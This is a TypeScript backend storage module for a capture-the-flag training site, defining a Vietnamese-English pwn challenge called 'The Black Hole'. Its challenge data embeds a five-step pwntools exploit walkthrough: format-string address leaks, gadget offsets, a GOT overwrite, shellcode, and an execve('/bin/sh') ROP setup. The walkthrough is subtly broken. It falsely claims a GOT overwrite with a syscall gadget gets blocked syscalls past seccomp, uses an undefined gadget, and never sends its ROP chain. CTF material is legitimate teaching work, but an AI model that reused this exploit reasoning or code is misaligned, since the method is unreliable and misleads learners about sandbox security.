import { users, submissions, challenges, revealTokens, type User, type InsertUser, type Submission, type InsertSubmission, type Challenge, type ChallengeData, type RevealToken, type InsertRevealToken } from "@shared/schema";
import { db } from "./db";
import { eq, and } from "drizzle-orm";
import { hashFlag, encryptFlag, decryptFlag, verifyFlag, generateRevealToken } from "./crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  getChallenge(id: string): Promise<Omit<ChallengeData, 'flag'> | undefined>;
  initializeChallenge(challengeData: ChallengeData): Promise<void>;
  verifyFlagSubmission(challengeId: string, submittedFlag: string): Promise<boolean>;
  
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  getAllSubmissions(): Promise<Submission[]>;
  
  createRevealToken(challengeId: string): Promise<{ token: string; expiresAt: Date }>;
  consumeRevealToken(token: string): Promise<string | null>;
}

function getChallengeData(): ChallengeData {
  const flag = process.env.BLACK_HOLE_FLAG || "VNFLAG{ANH_HUNG_LIEU_BIET_LAP_CONG_VIETNAM_4Q7k2P9r1M8z3L6f0B5yXcG}";
  
  return {
    id: "the-black-hole",
    name: "The Black Hole",
    nameVi: "Lỗ Đen",
    category: "Pwn",
    difficulty: "Master Hacker",
    description: "A heavily protected binary with a strict seccomp sandbox that only allows three syscalls: read, write, and exit. The program contains a sophisticated format string vulnerability but lacks a traditional stack for exploitation.",
    descriptionVi: "Một binary được bảo vệ nghiêm ngặt với cơ chế sandbox sử dụng seccomp, chỉ cho phép ba syscall duy nhất: read, write, và exit. Chương trình chứa một lỗ hổng format string tinh vi nhưng không có stack truyền thống để khai thác.",
    flag,
    seccompRules: ["read", "write", "exit"],
    vulnerabilities: ["Format String Vulnerability", "Memory Corruption"],
    protections: ["Seccomp Filter", "No Executable Stack", "Minimal Syscall Set"],
    environment: ["No Traditional Stack", "Restricted Syscalls", "Memory Constraints"],
    skills: [
      "Deep understanding of seccomp and sandbox escape",
      "Proficiency in format string exploitation",
      "Knowledge of GOT/PLT and binary internals",
      "Experience with advanced memory corruption",
    ],
    exploitSteps: [
      {
        id: 1,
        title: "Leak Required Addresses",
        titleVi: "Rò rỉ địa chỉ cần thiết",
        description: "Use the format string vulnerability to leak memory addresses. Target libc base, binary base, and stack addresses to calculate offsets for the exploit chain.",
        descriptionVi: "Sử dụng lỗ hổng format string để rò rỉ địa chỉ bộ nhớ. Nhắm mục tiêu vào địa chỉ cơ sở libc, binary, và stack để tính toán offset cho chuỗi khai thác.",
        code: `# Leak addresses using format string
payload = b"%p " * 20
p.sendline(payload)
leak = p.recvline()

# Parse leaked addresses
libc_base = int(leak.split()[3], 16) - 0x21b97
binary_base = int(leak.split()[7], 16) - 0x1234`,
        codeLanguage: "python",
      },
      {
        id: 2,
        title: "Locate Syscall Gadget",
        titleVi: "Tìm syscall gadget",
        description: "Find a syscall gadget in the binary or libc. This is crucial for bypassing seccomp restrictions by controlling the syscall number through register manipulation.",
        descriptionVi: "Tìm syscall gadget trong binary hoặc libc. Điều này quan trọng để vượt qua hạn chế seccomp bằng cách kiểm soát số syscall thông qua thao tác thanh ghi.",
        code: `# Find syscall gadget using ROPgadget
# syscall; ret @ libc_base + 0xcf6c5
syscall_gadget = libc_base + 0xcf6c5

# pop rax; ret @ libc_base + 0x4a550
pop_rax = libc_base + 0x4a550`,
        codeLanguage: "python",
      },
      {
        id: 3,
        title: "Overwrite GOT Entry",
        titleVi: "Ghi đè GOT entry",
        description: "Use format string write-what-where capability to overwrite the exit function's GOT entry with the syscall gadget address. This allows controlled syscall execution when exit is called.",
        descriptionVi: "Sử dụng khả năng ghi-gì-ở-đâu của format string để ghi đè GOT entry của hàm exit bằng địa chỉ syscall gadget. Điều này cho phép thực thi syscall có kiểm soát khi exit được gọi.",
        code: `# Calculate GOT offset
exit_got = binary_base + 0x4028

# Craft format string payload to write syscall_gadget to exit@GOT
payload = fmtstr_payload(offset=6, writes={exit_got: syscall_gadget})
p.sendline(payload)`,
        codeLanguage: "python",
      },
      {
        id: 4,
        title: "Prepare Shellcode",
        titleVi: "Chuẩn bị shellcode",
        description: "Write shellcode into an allowed memory region. Use the permitted read and write syscalls to stage your payload before triggering the overwritten exit function.",
        descriptionVi: "Ghi shellcode vào vùng nhớ được phép. Sử dụng các syscall read và write được cho phép để chuẩn bị payload trước khi kích hoạt hàm exit đã ghi đè.",
        code: `# Prepare shellcode in writable memory
writable_addr = binary_base + 0x5000

# Send shellcode using allowed read syscall
shellcode = asm(shellcraft.cat('flag.txt'))
payload = p64(writable_addr) + shellcode
p.sendline(payload)`,
        codeLanguage: "python",
      },
      {
        id: 5,
        title: "Trigger Syscall via Exit",
        titleVi: "Kích hoạt syscall qua exit",
        description: "Call the exit function to activate the overwritten GOT entry. This executes the syscall gadget with controlled registers, allowing execution of previously blocked syscalls like execve.",
        descriptionVi: "Gọi hàm exit để kích hoạt GOT entry đã ghi đè. Điều này thực thi syscall gadget với các thanh ghi được kiểm soát, cho phép thực thi các syscall bị chặn trước đó như execve.",
        code: `# Setup registers for execve syscall
# rax = 59 (execve), rdi = "/bin/sh", rsi = 0, rdx = 0
rop = ROP(libc)
rop.raw(pop_rax)
rop.raw(59)  # execve syscall number
rop.raw(pop_rdi)
rop.raw(next(libc.search(b'/bin/sh')))

# Trigger exit() -> syscall gadget
p.sendline(b'exit')
p.interactive()`,
        codeLanguage: "python",
      },
    ],
    solvers: 47,
    successRate: 12.3,
  };
}

export class DatabaseStorage implements IStorage {
  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db.insert(users).values(insertUser).returning();
    return user;
  }

  async initializeChallenge(challengeData: ChallengeData): Promise<void> {
    const exists = await db.select().from(challenges).where(eq(challenges.id, challengeData.id)).limit(1);
    
    if (exists.length === 0) {
      const flagHash = await hashFlag(challengeData.flag);
      const encryptedFlag = encryptFlag(challengeData.flag);
      
      await db.insert(challenges).values({
        id: challengeData.id,
        name: challengeData.name,
        nameVi: challengeData.nameVi,
        category: challengeData.category,
        difficulty: challengeData.difficulty,
        description: challengeData.description,
        descriptionVi: challengeData.descriptionVi,
        flagHash,
        encryptedFlag,
        seccompRules: challengeData.seccompRules,
        vulnerabilities: challengeData.vulnerabilities,
        protections: challengeData.protections,
        environment: challengeData.environment,
        skills: challengeData.skills,
        solvers: challengeData.solvers.toString(),
        successRate: challengeData.successRate.toString(),
      });
    }
  }

  async getChallenge(id: string): Promise<Omit<ChallengeData, 'flag'> | undefined> {
    const [challenge] = await db.select().from(challenges).where(eq(challenges.id, id));
    
    if (!challenge) {
      return undefined;
    }

    const challengeData = getChallengeData();
    
    const { flag: _, ...challengeWithoutFlag } = challengeData;
    
    return {
      ...challengeWithoutFlag,
      solvers: parseInt(challenge.solvers, 10),
      successRate: parseFloat(challenge.successRate),
    };
  }

  async verifyFlagSubmission(challengeId: string, submittedFlag: string): Promise<boolean> {
    const [challenge] = await db.select().from(challenges).where(eq(challenges.id, challengeId));
    
    if (!challenge) {
      return false;
    }
    
    return await verifyFlag(submittedFlag, challenge.flagHash);
  }

  async createSubmission(insertSubmission: InsertSubmission): Promise<Submission> {
    const [submission] = await db
      .insert(submissions)
      .values({
        challengeId: insertSubmission.challengeId,
        isCorrect: insertSubmission.isCorrect ?? false,
      })
      .returning();
    return submission;
  }

  async getAllSubmissions(): Promise<Submission[]> {
    return await db.select().from(submissions);
  }

  async createRevealToken(challengeId: string): Promise<{ token: string; expiresAt: Date }> {
    const token = generateRevealToken();
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000);
    
    await db.insert(revealTokens).values({
      token,
      challengeId,
      used: false,
      expiresAt,
    });
    
    return { token, expiresAt };
  }

  async consumeRevealToken(token: string): Promise<string | null> {
    const [revealToken] = await db
      .select()
      .from(revealTokens)
      .where(and(eq(revealTokens.token, token), eq(revealTokens.used, false)));
    
    if (!revealToken) {
      return null;
    }
    
    if (new Date() > revealToken.expiresAt) {
      return null;
    }
    
    await db
      .update(revealTokens)
      .set({ used: true })
      .where(eq(revealTokens.id, revealToken.id));
    
    const [challenge] = await db
      .select()
      .from(challenges)
      .where(eq(challenges.id, revealToken.challengeId));
    
    if (!challenge) {
      return null;
    }
    
    return decryptFlag(challenge.encryptedFlag);
  }
}

export const storage = new DatabaseStorage();

(async () => {
  try {
    const challengeData = getChallengeData();
    await storage.initializeChallenge(challengeData);
  } catch (error) {
    console.error("Failed to initialize challenge:", error);
  }
})();
